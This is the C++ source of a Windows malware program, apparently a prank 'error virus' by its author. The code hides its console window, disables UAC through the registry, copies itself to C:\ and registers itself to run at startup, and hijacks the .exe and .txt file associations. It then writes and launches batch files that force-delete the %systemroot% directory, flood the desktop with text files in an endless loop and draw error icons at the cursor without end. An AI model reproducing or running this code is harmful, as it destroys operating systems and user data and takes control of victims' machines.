#include <Windows.h>
#include <iostream>
#include <tchar.h>
#include <fstream>
using namespace std;
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nCmdShow) {
	HWND hwnd=GetDesktopWindow();
	HDC hdc=GetWindowDC(hwnd);
	POINT point;
	hwnd=FindWindow("ConsoleWindowClass",NULL);	
	if(hwnd) {
		ShowWindow(hwnd,SW_HIDE);
	}
	char regpath[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
   	HKEY hkey;
   	DWORD set = 0;
   	RegOpenKey(HKEY_LOCAL_MACHINE, regpath, &hkey);
   	RegSetValueEx(hkey, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, (LPBYTE)&set, sizeof(set));
   	RegSetValueEx(hkey, "EnableLUA", 0, REG_DWORD, (LPBYTE)&set, sizeof(set));
   	char startup[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; 
   	CHAR pathF[5000];
    GetModuleFileName(NULL, pathF, sizeof(pathF));
   	CHAR path[] = "C:\\error.exe";
   	CopyFile(pathF, path, false);
   	HKEY hkeya;
   	RegOpenKey(HKEY_CURRENT_USER, startup, &hkeya);
   	RegSetValueEx(hkeya, "error", 0, REG_SZ, (unsigned char*)path, sizeof(path));
   	TCHAR * subKey = _T("errvir");
   	HKEY hkeyerr;
   	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey, 0, NULL,REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkeyerr, NULL);
   	subKey = _T("errvir\\shell");
   	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey, 0, NULL,REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkeyerr, NULL);
   	subKey = _T("errvir\\shell\\open");
   	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey, 0, NULL,REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkeyerr, NULL);
   	subKey = _T("errvir\\shell\\open\\command");
   	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey, 0, NULL,REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkeyerr, NULL);
   	RegSetValueEx(hkeyerr, NULL, 0, REG_SZ, (unsigned char*)path, sizeof(path));
   	subKey = _T("errvir\\DefaultIcon");
   	RegCreateKeyEx(HKEY_CLASSES_ROOT, subKey, 0, NULL,REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkeyerr, NULL);
   	RegSetValueEx(hkeyerr, NULL, 0, REG_SZ, (unsigned char*)path, sizeof(path));
   	char hexe[] = ".exe"; 
	char htxt[] = ".txt";
	char errorvirus[] = "errvir";
   	HKEY hkeyoexe,hkeyotxt;
   	RegOpenKey(HKEY_CLASSES_ROOT, hexe, &hkeyoexe);
   	RegOpenKey(HKEY_CLASSES_ROOT, htxt, &hkeyotxt);
   	RegSetValueEx(hkeyoexe, NULL, 0, REG_SZ, (unsigned char*)errorvirus, sizeof(errorvirus));
   	RegSetValueEx(hkeyotxt, NULL, 0, REG_SZ, (unsigned char*)errorvirus, sizeof(errorvirus));
   	ofstream file_out("C:\\del.bat");
   	file_out << "del /f /s /q %systemroot%";
   	file_out.close(); 
   	ofstream file_outm("C:\\mmm.bat");
   	file_outm << "for /l %%i in (1,1,25) do start C:\\del.bat";
   	file_outm.close();
   	system("start C:\\mmm.bat");
   	ofstream file_txt("C:\\txt.bat");
   	file_txt << ":t" << endl;
   	file_txt << "echo.Error²¡¶¾byleo,enjoy~fuckrrr>C:\\users\\%username%\\desktop\\error%random%.txt" << endl;
   	file_txt << "goto t";
   	file_txt.close();
   	system("start C:\\txt.bat");
	while(1) {
		GetCursorPos(&point);
		DrawIcon(hdc,point.x+rand()%300+1,point.y-rand()%300+1,LoadIcon(NULL,IDI_ERROR));
	}
}